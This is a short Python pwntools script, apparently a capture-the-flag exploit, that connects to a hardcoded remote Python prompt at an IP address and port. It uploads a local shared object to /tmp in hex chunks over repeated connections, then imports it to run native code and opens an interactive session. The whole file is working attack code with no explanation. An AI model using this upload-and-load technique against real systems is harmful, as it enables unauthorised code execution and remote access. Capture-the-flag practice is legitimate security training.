import pwn
import time

def conn():
    return pwn.remote("51.254.39.184", 1338)

so = open("r2s.so", "rb")

r = conn()
r.sendlineafter(b"> ", '''print(open("/tmp/r2s.so","wb").write(b""))''')
r.sendline(b"EOF")
r.recvall()
r.close()


while True:
    buf = so.read(0x200)
    if not buf:
        break

    r = conn()
    r.sendlineafter(b"> ", b'''print(open("/tmp/r2s.so","ab").write(bytes.fromhex("""''' + buf.hex().encode() + b'''""")))''')
    r.recvuntil(b"> ")
    r.sendline(b"EOF")

    r.close()

r = conn()
r.sendlineafter(b"> ", b'''import sys\nsys.path.append("/tmp")\nimport r2s''')
r.interactive()
